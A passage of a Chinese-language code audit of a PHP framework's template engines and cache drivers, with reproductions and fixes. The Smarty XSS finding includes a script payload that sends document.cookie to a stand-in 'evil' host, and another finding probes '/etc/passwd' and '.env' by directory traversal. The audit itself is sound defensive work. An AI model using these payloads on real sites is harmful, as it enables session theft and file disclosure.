- 问题: `extend()` 假定一定处在 `render()` 建立的缓冲区中。当在 `render()` 之外直接调用（控制器先输出部分内容再继承布局、`OutputCache` 中间件已开缓冲、CLI 命令拼装响应体），布局内容直接落到全局输出流，`render()` 无法捕获，也就无法参与 `Response` 对象构造、`OutputCache` 的内容收集与响应头处理。这与 `.comate/specs/project-inspection-and-fixes/doc.md` 的 BUG-12 同源，当前实现仍未在"无缓冲区"场景下自洽。
- 触发场景:
```php
file_put_contents("$dir/layout2.php", "OUT-OF-RENDER");
$v = new view\View($dir);
$v->extend('layout2');
// 实测： OUT-OF-RENDER[]  —— 内容已进入全局输出，extend() 返回值仍为 void
```
- 建议修复: 让 `extend()` 自身无条件建立缓冲边界，并把结果交回调用方：
```php
public function extend(string $layout): string
{
    $level = ob_get_level();
    ob_start();
    try {
        extract($this->renderData, EXTR_SKIP);
        $__view = $this;
        require $layoutFile;
        $out = (string) ob_get_clean();
        if ($level > $this->rootObLevel) { ob_clean(); }
        echo $out;
        return $out;
    } catch (\Throwable $t) {
        while (ob_get_level() > $level) { ob_end_clean(); }
        throw $t;
    }
}
```
并在 `Controller::view()`（`app/core/Controller.php:31-35`）中改为 `render($template, $data + ['__layout' => ...])` 的显式布局参数，避免在根缓冲语义之外调用 `extend()`。

### [高] HV-10 `TaggedCache::flush()` 恒返回 `true`，且 `set()` 与 `attachTag()` 之间的竞态导致 flush 漏删
- 文件: `app/cache/TaggedCache.php` 行号: 26-33、118-131
- 代码:
```php
public function flush(): bool
{
    foreach ($this->tags as $tag) {
        $this->store->flushByTag($tag);      // 返回值被丢弃
    }
    return true;                             // 无条件成功
}

private function tagKey(string $key): void
{
    foreach ($this->tags as $tag) {
        $this->store->attachTag($key, $tag); // 与 set() 分两次独立操作
    }
}
```
- 问题: ① `flush()` 丢弃 `flushByTag()` 返回值并恒返回 `true`，存储层失败（磁盘满、权限不足、锁获取失败）时调用方**无法感知**，会误以为标签缓存已清空而继续写入新数据，形成"旧数据 + 新数据"混存的脏状态；`clear()`（85-88 行）直接委托 `flush()`，同样不可信。② `set()` 与 `attachTag()` 是两次独立操作，中间存在窗口：进程 A `set()` 写完数据尚未 `attachTag()`；进程 B `flushByTag()` 读标签列表（不含该 key）并清空；随后 A 再把 key 加入标签 —— **该 key 永远不会被标签失效清除**。若配合无 TTL（`set($k,$v,0)`）即为永久性脏缓存。
- 触发场景:
```php
// ① 失败被吞
$store = new class implements core\contract\CacheInterface {
    // flushByTag() 恒返回 false，其余方法省略
};
var_dump((new cache\TaggedCache($store, ['a']))->flush());
// 实测： bool(true)   —— 实际一次都没删成功

// ② 竞态（伪代码时序）
$tagged = $cache->tags(['users']);
// A: $tagged->set('user:1', $data, 0);   // set 完成，尚未 attachTag
// B: $tagged->flush();                   // 标签列表为空，flush 结束
// A: attachTag('user:1','users')         // "僵尸"标签，user:1 永不被标签清除
```
- 建议修复: ① 传播失败并汇总：
```php
public function flush(): bool
{
    $ok = true;
    foreach (array_unique($this->tags) as $tag) {
        if (!$this->store->flushByTag($tag)) {
            $ok = false;
            error_log("TaggedCache: flushByTag('{$tag}') failed");
        }
    }
    return $ok;
}
```
② 消除 set/attachTag 竞态，采用 Laravel 的"标签代次 + 原子登记"方案：`flushByTag()` 先递增标签代次，`set()` 取当前代次并把 (key, 代次) 一起登记，使 flush 与写入可通过 Lua/事务对齐。`tags()`（90-93 行）合并时也应 `array_unique()`，当前嵌套 tags 会重复 flush。

---

### [高] HV-11 `FileCache` 无 store 前缀，`clear()` 会清空共享目录下的其他 store
- 文件: `app/cache/FileCache.php` 行号: 30-44（构造）、52-55（`getFile`）、253-277（`clear`）
- 代码:
```php
$this->path = rtrim($config['path'] ?? (STORAGE_PATH . 'cache'), '/\\') . '/';
...
private function getFile(string $key): string
{
    return $this->path . hash('sha256', $key) . '.cache';   // 仅按 key 哈希，无 store 命名空间
}

public function clear(): bool
{
    foreach (@glob($this->path . '*.cache') ?: [] as $file) { @unlink($file); }
    foreach (@glob($this->path . 'tag_*.json') ?: [] as $f) { @unlink($f); }
    foreach (@glob($this->path . '*.lock') ?: [] as $f) { @unlink($f); }
    return true;
}
```
- 问题: `FileCache` 缺少 Redis/Memcached 都有的 `prefix` 配置项（`app/config/cache.php` 中 `file` store 只有 `driver/path/expire`），因此**同一目录内的所有 `FileCache` 实例共享同一 key 命名空间**，且 `clear()` 按目录通配符删除，会连带清空其它 store 的全部数据。两个 store 指向同一目录（如测试环境独立 store 但复用 `STORAGE_PATH.'cache'`）时互不感知；`clear()` 的作用域是"整个目录"而非"本 store"，违反直觉语义。
- 触发场景:
```php
$store1 = new cache\FileCache(STORAGE_PATH.'cache');
$store2 = new cache\FileCache(STORAGE_PATH.'cache');   // 第二个 store，同目录
$store2->set('other_store_key', 'v', 60);
$store1->set('store1_key', 'v', 60);
$store1->clear();
var_dump($store2->has('other_store_key'));
// 实测： store1=gone  store2=GONE-BY-STORE1-CLEAR
```
附带观察：`config_cache.php` 与 `qb_cache.php` 位于同一目录（`app/core/Application.php:73`、`app/db/QueryBuilder.php:474`），当前通配符恰好不匹配 `*.php`，实测这两个文件未被删除；但这种"靠扩展名巧合避开"没有显式保护。
- 建议修复: 为 `FileCache` 增加 `prefix` 支持并让 `clear()` 只删除本前缀文件：
```php
$this->prefix = (string) ($config['prefix'] ?? 'lightphp:cache:');

private function getFile(string $key): string
{
    return $this->path . hash('sha256', $this->prefix . $key) . '.cache';
}
```
并在 `app/config/cache.php` 为 `file` store 增加 `'prefix' => env('CACHE_PREFIX', 'lightphp:cache:')`。

---

### [高] HV-12 `MemcachedCache::attachTag()` 读-改-写竞态，标签键永久不过期且无界增长
- 文件: `app/cache/MemcachedCache.php` 行号: 291-307
- 代码:
```php
public function attachTag(string $key, string $tag): void
{
    $tagKey = $this->prefix . 'tag:' . $tag;
    $existing = $this->memcached->get($tagKey);
    $keys = [];
    if ($this->memcached->getResultCode() === \Memcached::RES_SUCCESS) {
        $keys = $this->unserialize($existing);
        if (!is_array($keys)) { $keys = []; }
    }
    if (!in_array($key, $keys, true)) {
        $keys[] = $key;
        $this->memcached->set($tagKey, $this->serialize($keys), 0);   // TTL=0 永久
    }
}
```
- 问题: 三个缺陷叠加。① **无原子性**："读取-合并-写回"是三步 RMW，两个并发 `attachTag` 会互相覆盖导致标签登记丢失 → `flushByTag()` 漏删数据 → 脏缓存长期存在；Memcached 提供了 CAS token，这里完全没用。② **TTL=0 永久不过期**：注释声称"标签应与缓存项同生命周期"，实现却是永久，导致标签键与成员列表只增不减（每次缓存过期都会追加一个已失效 key）。③ **无界增长 + O(n²) 构建**：`in_array()` 线性查重，成员达数万时每次都要反序列化整个数组并线性扫描，单条标签键还可能超过 Memcached 1MB 上限导致静默写入失败。
- 触发场景: 高 QPS 的标签化缓存（如给每篇文章详情打标签）：
```php
$tagged = $cache->tags(['posts']);
foreach ($ids as $id) {
    $tagged->set("post:$id", $data, 60);   // 每条都触发 attachTag 的 RMW
}
// 并发下：$tagged->flush() 后仍有文章显示旧数据；
// 长期运行后 tag:posts 键体积膨胀，set 静默失败（返回值未被检查）
```
- 建议修复: 用 CAS 保证原子合并，并给标签键设置 TTL 与容量上限：
```php
for ($i = 0; $i < 5; $i++) {
    $value = $this->memcached->get($tagKey);
    $ok = $this->memcached->getResultCode() === \Memcached::RES_SUCCESS;
    $keys = $ok ? $this->unserialize($value) : [];
    if (!is_array($keys)) { $keys = []; }
    if (in_array($key, $keys, true)) { return; }
    $keys[] = $key;
    if (count($keys) > self::MAX_TAG_MEMBERS) { array_shift($keys); }   // 容量上限
    $payload = $this->serialize($keys);
    if ($ok && $this->memcached->cas(intval($this->memcached->getCasToken()), $tagKey, $payload, self::TAG_TTL)) {
        return;
    }
    if (!$ok && $this->memcached->add($tagKey, $payload, self::TAG_TTL)) { return; }
}
error_log("MemcachedCache: attachTag('{$tag}') CAS contention, key '{$key}' may be untracked");
```
`flushByTag()`（313-328 行）也应在删除成员后 CAS 截断/重建标签键。

### [高] HV-13 `MemcachedCache::setMany()` 未做 TTL 归一化，与 `set()` 语义不一致导致批量写入立即过期
- 文件: `app/cache/MemcachedCache.php` 行号: 75-88（`set`）、259-269（`setMany`）
- 代码:
```php
public function set(string $key, mixed $value, ?int $ttl = null): bool
{
    $ttl = $ttl ?? $this->defaultTtl;
    if ($ttl < 0) { $ttl = 0; }                       // 负数归一化为永久
    if ($ttl > 2592000) { $ttl = time() + $ttl; }     // >30 天转绝对时间戳
    return $this->memcached->set($this->key($key), $this->serialize($value), $ttl);
}

public function setMany(array $values, ?int $ttl = null): bool
{
    $ttl = $ttl ?? $this->defaultTtl;
    $data = [];
    foreach ($values as $key => $value) { $data[$this->key((string) $key)] = $this->serialize($value); }
    return $this->memcached->setMulti($data, $ttl);   // 归一化逻辑完全缺失
}
```
- 问题: `set()` 显式处理了 Memcached 的两个 TTL 陷阱（负值 = 已过期；> 30 天 = Unix 时间戳），`setMany()` 却把原始 `$ttl` 直接透传。结果：① `setMany($v, -1)` → Memcached 视负值为"立即过期"，全部数据写完即失效；② `setMany($v, 31536000)`（31 天）→ 被当作 Unix 时间戳 `31536000`（1970 年）→ **全部立即过期**。`set()` 与 `setMany()` 对同一个 TTL 给出完全相反的结果，且 `setMany()` 返回 `true` 让调用方以为写入成功。此外 `setMulti()` 的部分失败不会体现在返回值中。
- 触发场景:
```php
$cache = new cache\MemcachedCache(['servers' => [['host'=>'127.0.0.1','port'=>11211]]]);
$cache->set('a', 'v', 31536000);                       // 31 天 → 正常写入（转为时间戳）
$cache->setMany(['b' => 'v', 'c' => 'v'], 31536000);  // 同样 31 天 → 立即过期
var_dump($cache->has('b'));                            // false
```
（本机未安装 memcached 扩展，此结论基于 Memcached 协议文本语义与代码路径推演，建议在集成环境复核。）
- 建议修复: 抽取统一的 TTL 归一化函数并在所有写入路径复用：
```php
private function normalizeTtl(int $ttl): int
{
    if ($ttl < 0) { return 0; }                       // 永久
    return $ttl > 2592000 ? time() + $ttl : $ttl;
}

public function setMany(array $values, ?int $ttl = null): bool
{
    $ttl = $this->normalizeTtl($ttl ?? $this->defaultTtl);
    // ...
    $ok = $this->memcached->setMulti($data, $ttl);
    if (!$ok) { error_log('MemcachedCache: setMulti failed: ' . $this->memcached->getResultMessage()); }
    return (bool) $ok;
}
```
并同步修正 `increment()`/`decrement()` 回退路径中直接使用 `$this->defaultTtl` 的两处（192、221 行）。

---

### [高] HV-14 `RedisCache::increment()/decrement()` 非原子读-改-写，并发下丢失更新
- 文件: `app/cache/RedisCache.php` 行号: 237-283
- 代码:
```php
public function increment(string $key, int $step = 1): int
{
    $fullKey = $this->key($key);
    $exists = (bool) $this->redis->exists($fullKey);
    if (!$exists) { $this->set($key, $step); return $step; }
    $ttl = $this->redis->ttl($fullKey);          // ①
    $value = $this->redis->get($fullKey);         // ②
    $current = ($value === false) ? 0 : (int) $value;
    $new = $current + $step;                      // ③
    if ($ttl > 0) { $this->redis->setex($fullKey, $ttl, $new); }   // ④
    else { $this->redis->set($fullKey, $new); }
    return $new;
}
```
- 问题: 四步独立往返（exists / ttl / get / setex），**没有任何原子性保证**。Redis 原生提供 `INCRBY`/`DECRBY`，这里为兼容 JSON 序列化而刻意绕开。两个并发请求读到相同 `current`、各自算出相同 `new`，后写覆盖先写 → **计数丢失更新**。`FileCache` 版本用 `flock` 保护、`MemcachedCache` 版本用原生 `increment()` 尝试原子，只有 Redis 版本是纯非原子，跨驱动行为不一致。`ttl` 与 `get` 之间也存在窗口：TTL 可能已到期导致 `ttl()` 返回 -2 却仍执行 `setex`。
- 触发场景: 页面浏览量、库存扣减、限流计数：
```php
// 20 个并发请求同时计数
for ($i = 0; $i < 20; $i++) { async(fn() => $cache->increment('page:views')); }
// 期望 20，实际可能是 1~20 之间的任意值（丢失更新）
```
（本机未安装 redis 扩展，此结论基于代码路径推演；建议在集成环境用并发脚本复核。）
- 建议修复: 优先使用 Redis 原子计数器，把计数键与序列化数据分离：
```php
public function increment(string $key, int $step = 1): int
{
    $fullKey = $this->key($key);
    $prev = $this->redis->getOption(\Redis::OPT_SERIALIZER);
    $this->redis->setOption(\Redis::OPT_SERIALIZER, \Redis::SERIALIZER_NONE);
    try {
        $new = (int) $this->redis->incrby($fullKey, $step);
        if ($new === $step) { $this->redis->expire($fullKey, max(1, $this->defaultTtl)); }
        return $new;
    } finally {
        $this->redis->setOption(\Redis::OPT_SERIALIZER, $prev);
    }
}
```
若必须保留 JSON 值语义，则用 Lua 把 `GET + SETEX` 合并为一次原子执行：
```lua
local v = redis.call('get', KEYS[1]); local cur = tonumber(v) or 0
local n = cur + tonumber(ARGV[1])
if tonumber(ARGV[2]) > 0 then redis.call('setex', KEYS[1], ARGV[2], n) else redis.call('set', KEYS[1], n) end
return n
```

### [高] HV-15 `Smarty` 包装器从未开启 `escapeHtml`，`{$var}` 默认不转义（XSS）
- 文件: `app/view/Smarty.php` 行号: 15-49
- 代码:
```php
$this->smarty = new \Smarty();
$this->smarty->setTemplateDir($this->templatePath);
$this->smarty->setCompileDir($this->compilePath);
$this->smarty->setCacheDir($this->cachePath);
$this->smarty->setConfigDir($this->configPath);
$this->smarty->setCompileCheck(\Smarty::COMPILECHECK_ON);
$this->smarty->setCaching(\Smarty::CACHING_OFF);
$this->smarty->setForceCompile(false);
// 没有任何 escapeHtml / security policy 配置
```
- 问题: Smarty 3/4 的 `$escape_html` 默认为 `false`，即 `{$var}` **原样输出**。而 `Blade` 的 `{{ }}` 与 `View` 的自动转义都是默认转义，同一项目内三套模板引擎的默认安全级别不一致，开发者从 Blade 迁移到 Smarty 时极易引入存储型 XSS。包装器既未调用 `setEscapeHtml(true)`，也未显式配置 `Smarty\Security` 白名单与 `php_handling` 策略，安全默认值完全依赖第三方库的默认行为（不同 Smarty 大版本的默认值并不相同）。
- 触发场景:
```
// app/view/templates/user/list.tpl
{foreach $users as $u}<div>{$u->name}</div>{/foreach}
```
```php
// SmartyUserController：$users 中的 name 来自用户输入
// 攻击者提交 name = '<script>fetch("//evil/?c="+document.cookie)</script>'
// 输出：<div><script>fetch(...)</script></div>  —— XSS 成立
```
- 建议修复: 在构造函数中显式设定安全默认值并把策略收口到一处：
```php
$this->smarty->setEscapeHtml(true);              // 或 \Smarty::ESCAPE_ALL（Smarty 4）
$this->smarty->setSecurityPolicy(new \Smarty\Security($this->smarty));
$this->smarty->security_policy->php_handling   = \Smarty\Security::PHP_DISABLED;
$this->smarty->security_policy->php_functions = [];
$this->smarty->security_policy->static_classes = [];
$this->smarty->setAllowPhpHandling(false);      // 模板中禁止 {php}
```
并在 `docs/guide.md` 的 Smarty 章节说明"输出原始 HTML 需显式使用 `{$var nofilter}`"。

---

### [高] HV-16 `Smarty::exists()` 直接拼接模板名，`file_exists` 可用于目录穿越探测
- 文件: `app/view/Smarty.php` 行号: 75-78
- 代码:
```php
public function exists(string $template): bool
{
    return file_exists($this->templatePath . $template);
}
```
- 问题: 模板名未经任何规范化或前缀校验就与 `templatePath` 拼接后交给 `file_exists`。与同文件中 `fetch()`/`display()` 依赖 Smarty 自身 `Security` 策略不同，`exists()` **绕过了 Smarty 的所有保护**。若模板名来自请求参数，攻击者可用它探测模板目录之外任意文件是否存在（信息泄露），并可借助 `SmartyView::exists()`（102-105 行）把结果反射回响应。`View::validatePath()`（343-351 行）与 `Blade::compile()`（160-167 行）都做了 `realpath` 前缀校验，Smarty 包装器是三者中唯一缺失的。
- 触发场景:
```php
$smarty = new view\Smarty(VIEW_PATH);
// 模板名来自请求参数
var_dump($smarty->exists('../../../.env'));          // 探测 .env 是否存在
var_dump($smarty->exists('../../../../etc/passwd'));  // 探测系统文件
```
- 建议修复: 与 `Blade`/`View` 对齐，先规范化再用 `realpath` 校验前缀：
```php
public function exists(string $template): bool
{
    $real = realpath($this->templatePath . ltrim(str_replace('\\', '/', $template), '/'));
    $base = realpath($this->templatePath);
    if ($real === false || $base === false) { return false; }
    if ($real !== $base && !str_starts_with($real, $base . DIRECTORY_SEPARATOR)) { return false; }
    return is_file($real);
}
```

### [高] HV-17 `FileCache` 标签文件无界增长，且 `ftruncate()+fwrite()` 无写入校验
- 文件: `app/cache/FileCache.php` 行号: 464-499（`attachTag`）、507-548（`flushByTag`）
- 代码:
```php
if (!in_array($key, $keys, true)) { $keys[] = $key; }
ftruncate($fp, 0);                 // 先截断
rewind($fp);
fwrite($fp, json_encode($keys, JSON_UNESCAPED_UNICODE));   // 返回值未检查
```
- 问题: ① **无界增长**：缓存项过期后其数据文件被 `read()` 惰性删除，但**标签文件中的 key 记录永不清理**（`delete()` 也不摘除标签），标签数组随业务运行持续膨胀，`attachTag()` 每次都要全量 `json_decode` + `in_array` 线性扫描 + 全量重写，复杂度 O(n²)，单个标签文件会突破合理体积。② **非原子重写**：`ftruncate(0)` 先清空再写入，若 `fwrite` 因磁盘满/配额超限失败（返回值未检查）而只写入部分内容，标签文件即被截断损坏 → **该标签下所有 key 的追踪记录全部丢失** → 后续 `flushByTag()` 永久漏删，形成不可恢复的脏缓存。③ `json_encode` 失败（key 含非法 UTF-8）时静默写入 `false`（空串），同样丢失全部记录。
- 触发场景:
```php
$cache = new cache\FileCache(STORAGE_PATH.'cache');
$tagged = new cache\TaggedCache($cache, ['users']);
for ($i = 0; $i < 5; $i++) { $k = "page$i"; $cache->set($k, 'v', 1); $tagged->set($k, 'v', 1); }
sleep(2); $cache->get('page0');   // 触发惰性过期，page0 的数据文件已删除
echo file_get_contents(STORAGE_PATH.'cache/tag_'.hash('sha256','users').'.json');
// 实测： ["page0","page1","page2","page3","page4"]
//        ↑ page0 数据文件已不存在，标签记录仍保留，且永不回收
```
- 建议修复: 引入裁剪与原子重写：
```php
if (!in_array($key, $keys, true)) { $keys[] = $key; }
// 裁剪：剔除已不存在的缓存项（建议按 mtime 惰性触发，避免每次都做 file_exists）
$keys = array_values(array_filter($keys, fn($k) => file_exists($this->getFile((string) $k))));
$payload = json_encode($keys, JSON_UNESCAPED_UNICODE);
if ($payload === false) { error_log("FileCache: tag encode failed for '{$tag}'"); return; }

$tmp = $tagFile . '.' . bin2hex(random_bytes(6)) . '.tmp';
if (file_put_contents($tmp, $payload, LOCK_EX) === false || !@rename($tmp, $tagFile)) {
    @unlink($tmp);
    error_log("FileCache: failed to persist tag file '{$tagFile}'");
}
```
`flushByTag()`（539-541 行）同样应改为"先按当前列表删除 key，再用 tmp+rename 原子写回 `[]`"，避免删除过程被中断时标签与数据不一致。

---

### [高] HV-18 Blade 缺失模板时静默返回空串并产生 3 条 warning，白屏难以定位
- 文件: `app/view/Blade.php` 行号: 113-124、169-173
- 代码:
```php
$content = file_get_contents($sourcePath);       // 169 行：未加 @，直接抛 warning
if ($content === false) {
    trigger_error("Blade: Template source not found: {$sourcePath}", E_USER_WARNING);
    return;
}
...
if (!file_exists($cacheFile)) {
    trigger_error("Blade: Failed to compile template '{$template}', cache file missing", E_USER_WARNING);
    return '';                                   // 返回空串，不抛异常
}
```
- 问题: 模板不存在或编译失败时，`renderTemplate()` 返回空字符串而非抛出异常，控制器会把空内容当作正常响应返回 200 白屏。`View::render()` 在同样场景下明确抛出 `RuntimeException("View [{$template}] not found")`（88-90 行），两引擎错误处理策略不一致。此外 169 行的 `file_get_contents()` 没有 `@`，会额外输出一条 PHP 原生 warning，在开启 `display_errors` 的开发环境下日志噪音更大。
- 触发场景:
```php
echo "[" . $b->render('does_not_exist') . "]";
```
实测输出：
```
Warning: file_get_contents(.../does_not_exist.blade.php): Failed to open stream: No such file or directory in .../Blade.php on line 169
Warning: Blade: Template source not found: .../does_not_exist.blade.php in .../Blade.php on line 171
Warning: Blade: Failed to compile template 'does_not_exist', cache file missing in .../Blade.php on line 122
[]
```
- 建议修复: 与 `View` 对齐，失败即抛异常，由上层统一处理：
```php
public function render(string $template, array $data = []): string
{
    $sourcePath = $this->templatePath . $template . '.blade.php';
    if (!file_exists($sourcePath)) {
        throw new \RuntimeException("Blade: Template [{$template}] not found at {$sourcePath}");
    }
    ...
}
```
并把 `compile()` 内部所有 `trigger_error` 分支改为"记录日志 + 返回 false"，由 `renderTemplate()` 统一判定；169 行改用 `is_file()` 前置判断。

---

### [高] HV-19 Blade 不支持 `{{-- --}}` 注释语法，且自定义指令输出不再经转义处理
- 文件: `app/view/Blade.php` 行号: 187-209（`compileString` 顺序）、217-228（`compileEchos`）、378-394（`compileDirectives`）
- 代码:
```php
$content = $this->compileEach($content);
$content = $this->compileStatements($content);
$content = $this->compileEchos($content);        // 219-221 行的 {{ }} 正则
$content = $this->compileDirectives($content);    // 自定义指令在转义之后
```
```php
$content = (string) preg_replace('/\{\{(.+?)\}\}/s', '<?= htmlspecialchars((string) $1, ENT_QUOTES, \'UTF-8\') ?>', $content);
```
- 问题: ① **不支持 Blade 注释语法**：`{{-- comment --}}` 会被 221 行的 `{{ ... }}` 正则捕获，编译为 `<?= htmlspecialchars((string) -- comment --) ?>` → 语法错误。任何从 Laravel 迁移过来的模板都会立刻崩溃。② **编译顺序导致二次编译**：`compileEchos()` 在 `compileStatements()` 之后运行，因此指令替换生成的 PHP 代码中如果含有 `{{ }}` 字面量（例如区块名或表达式里），会被当作输出语句再次编译。③ `compileDirectives()` 排在 `compileEchos()` 之后，自定义指令处理器返回的 `{{ }}` 不再被转义，等于给自定义指令开了一个"绕过转义"的隐式通道。
- 触发场景:
```php
file_put_contents("$dir/c.blade.php", "A{{-- hidden --}}B");
$b->render('c');
// 实测： Parse error: syntax error, unexpected token "--", expecting "->" or "?->" or "[" in ...php on line 1
```
```php
file_put_contents("$dir/braces.blade.php", "@section('a{{b}}c')X@endsection|END");
$b->render('braces');
// 实测： Parse error: syntax error, unexpected identifier "UTF", expecting ")" in ...php on line 1
//       （'{{b}}' 被编译进 startSection() 的实参里，生成非法 PHP）
```
- 建议修复: 在 `compileString()` 的最前面先剥离注释，再执行其余编译步骤：
```php
$content = (string) preg_replace('/\{\{--.*?--\}\}/s', '', $content);   // Blade 注释
$content = (string) preg_replace('/\{!!.*?!!\}/s', ...);                // 保持原样输出语义
```
同时调整编译顺序为 `verbatim → 注释 → statements → directives → includes → echos`，让 `{{ }}` 的处理始终落在最后，并让 `compileDirectives()` 在返回前对结果做一次 PHP 语法自检（`php -l` 或 `token_get_all`）以拦截生成错误。

## 三、中危缺陷

### [中] MV-01 `FileCache` 以 JSON 序列化，`private/protected` 属性被静默丢弃，写入失败无任何日志
- 文件: `app/cache/FileCache.php` 行号: 144-174（`write`）
- 代码:
```php
$content = json_encode($data, JSON_UNESCAPED_UNICODE);
if ($content === false) {
    return false;                    // 静默失败，无日志、无异常
}
```
- 问题: ① **类型保真度缺失**：`json_encode` 对含 `private`/`protected` 属性的对象只序列化公有属性，其余**静默丢失且返回 `true`**，读回来变成残缺对象；与 `RedisCache`（JSON 序列化器）、`MemcachedCache`（`serialize()`）三者行为完全不同（见 MV-02），跨驱动切换时数据形态会变。② **写入失败完全静默**：`NAN`、`INF`、非法 UTF-8、资源、`Closure` 都让 `json_encode` 返回 `false`，`set()` 返回 `false` 但不记日志也不抛异常；`TaggedCache::set()` 会因此不打标签，`OutputCache` 会静默丢缓存。③ 未使用 `JSON_THROW_ON_ERROR`，错误信息被丢弃。
- 触发场景:
```php
class M { public $a = 1; private $secret = 'SHOULD-NOT-LEAK'; }
$c = new cache\FileCache(STORAGE_PATH.'cache');
var_dump($c->set('obj', new M(), 60));          // 实测： true
echo json_encode($c->get('obj'));               // 实测： {"a":1}   —— secret 静默消失
var_dump($c->set('nan', NAN, 60));              // 实测： false，无任何日志
var_dump($c->set('bad', "\xB1\x31", 60));       // 实测： false（非法 UTF-8）
var_dump($c->set('res', fopen('php://memory','r'), 60)); // 实测： false（资源）
```
- 建议修复: 明确序列化策略并让失败可观测：
```php
try {
    $content = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_THROW_ON_ERROR);
} catch (\JsonException $e) {
    error_log("FileCache: failed to serialize key '{$key}': " . $e->getMessage());
    return false;
}
```
并在 `CacheInterface` 文档中明确"仅支持可被 JSON 表示的值"，或为 FileCache 增加可选 `serialize`/`unserialize` 开关；同时提供 `throw_on_error` 配置让失败时可抛异常。

---

### [中] MV-02 `MemcachedCache::unserialize()` 对对象返回 `__PHP_Incomplete_Class`，三驱动类型语义不一致
- 文件: `app/cache/MemcachedCache.php` 行号: 50-62
- 代码:
```php
private function unserialize(string $value): mixed
{
    $result = @unserialize($value, ['allowed_classes' => false]);
    if ($result === false && $value !== serialize(false)) {
        return null;
    }
    return $result;
}
```
- 问题: `allowed_classes => false` 是**正确的**安全做法（阻止 PHP 对象注入），但副作用被忽略：`unserialize()` 遇到类实例时返回 `__PHP_Incomplete_Class` 而非原对象或 `null`。调用方 `get()` 直接把它当正常值返回，业务代码访问其属性/方法时抛 `Error: The script tried to execute a method or access a property of an incomplete object`。更隐蔽的是：缓存里的**合法对象**读回后变成不可用对象，而 `has()` 仍返回 `true`，故障点远离写入点。由此形成三驱动类型不一致：FileCache/RedisCache 把对象降级为数组，`MemcachedCache` 返回不可用的 incomplete class。
- 触发场景:
```php
$ref = new ReflectionClass(cache\MemcachedCache::class);
$u = $ref->getMethod('unserialize'); $u->setAccessible(true);
$obj = $ref->newInstanceWithoutConstructor();
class Evil { public $x; }
echo get_class($u->invoke($obj, serialize(new Evil())));   // 实测： __PHP_Incomplete_Class
```
同类往返验证（实测）：`false → boolean false`、`null → NULL`、`0 → integer 0`、`['a'=>1] → array` 均正确，仅对象类型失效。
- 建议修复: 明确"Memcached 驱动只支持标量与数组"，或对受信任数据提供类白名单：
```php
private function unserialize(string $value): mixed
{
    try {
        return unserialize($value, ['allowed_classes' => $this->allowedClasses]);
    } catch (\Throwable) {
        error_log('MemcachedCache: unserialize failed');
        return null;
    }
}
```
构造时提供 `unserialize_classes` 白名单配置（默认 `[]`），并在 `get()` 中检测 `__PHP_Incomplete_Class` 后记日志并返回默认值。

### [中] MV-03 `RedisCache::get()`/`many()`/`flushByTag()` 每次未命中都额外发一次 `EXISTS`，N+1 往返
- 文件: `app/cache/RedisCache.php` 行号: 83-92、291-316、412-433
- 代码:
```php
public function get(string $key, mixed $default = null): mixed
{
    $value = $this->redis->get($this->key($key));
    if ($value === false && !$this->redis->exists($this->key($key))) {   // 第二次往返
        return $default;
    }
    return $value;
}
```
- 问题: 该 `exists()` 兜底是为区分"存储的布尔 false"与"键不存在"而加的，但它把**每一次缓存未命中**的 Redis 往返数从 1 翻倍。在 `OutputCache` 这类以未命中为常态的场景（首页未缓存）等于凭空增加约 50% 的 Redis QPS。`many()` 对每个缺失键各发一次 `exists`（312 行），100 个 key 最多 101 次往返；`flushByTag()` 同样对每个成员键做一次 `exists`（422 行）。
- 触发场景:
```php
$cache->many($keys);              // 100 key、90 未命中 → 1 次 MGET + 90 次 EXISTS = 91 次往返
$cache->tags(['posts'])->flush(); // → 1 次 SMEMBERS + N 次 EXISTS + 1 次 DEL
```
（本机未安装 redis 扩展，此结论基于代码路径推演。）
- 建议修复: 去掉兜底 `exists()`，改用能区分"值"与"缺失"的方案：
```php
public function get(string $key, mixed $default = null): mixed
{
    $value = $this->redis->get($this->key($key));
    return $value === false ? $default : $value;   // 语义：无法直接缓存 false
}
```
若必须支持缓存 `false`，可改用自定义哨兵值或 `\Redis\RedisArray`；`many()` 用一次批量 `EXISTS k1 k2 ...` 判断，或接受"缺失键返回 null"并在文档中说明。

---

### [中] MV-04 `RedisCache::remember()` 锁释放与 JSON 序列化器交互存在版本相关风险，且兜底路径必然重复执行回调
- 文件: `app/cache/RedisCache.php` 行号: 62、188-228
- 代码:
```php
$this->redis->setOption(\Redis::OPT_SERIALIZER, \Redis::SERIALIZER_JSON);   // 62 行
...
$locked = $this->redis->set($lockKey, $lockValue, ['nx', 'ex' => 10]);
if ($locked) {
    try { ... } finally {
        $script = "if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end";
        $this->redis->eval($script, [$lockKey, $lockValue], 1);
    }
}
for ($retry = 0; $retry < 5; $retry++) { usleep(random_int(10000, 100000)); ... }
$value = $callback();      // 225 行：重试耗尽后无条件重复执行业务逻辑
```
- 问题: 三个问题。① **锁值与序列化器不匹配的风险（待集成环境验证）**：`$lockValue` 是十六进制字符串，在 JSON 序列化器下会以带引号的 JSON 字符串写入 Redis；而 `eval` 的 `ARGV` 通常按原始字节传输。Lua 中 `redis.call('get',KEYS[1])` 得到的带引号字符串与不带引号的 `ARGV[1]` 比较**可能不相等** → 锁永不被释放，每次 `remember()` 都要等 10 秒 TTL 自然过期才可重入。② **回调耗时超过锁 TTL**（默认 10 秒）时锁提前失效，另一进程可重复执行回调；`finally` 中 Lua 因值不匹配不会误删他人锁（这点设计正确）。③ **兜底路径无条件执行回调**（225-227 行），5 次重试（最长约 0.5 秒）后即放弃等待并重复执行业务逻辑，高并发下形成缓存击穿；而 `FileCache::remember()` 在同等场景下是阻塞等待，行为不一致。
- 触发场景: 缓存重建回调耗时较长时的并发重建：
```php
$cache->remember('heavy:report', 600, function () {
    sleep(3);                      // 接近/超过锁 TTL 的临界场景
    return $this->buildReport();   // 慢查询
});
// 5 个并发请求 → 部分请求在重试耗尽后同时执行 buildReport()，下游被重复打多次
```
- 建议修复: ① 锁键改用**不经过序列化器**的原生写入：
```php
$prev = $this->redis->getOption(\Redis::OPT_SERIALIZER);
$this->redis->setOption(\Redis::OPT_SERIALIZER, \Redis::SERIALIZER_NONE);
try { $locked = $this->redis->set($lockKey, $lockValue, ['nx', 'ex' => $lockTtl]); }
finally { $this->redis->setOption(\Redis::OPT_SERIALIZER, $prev); }
```
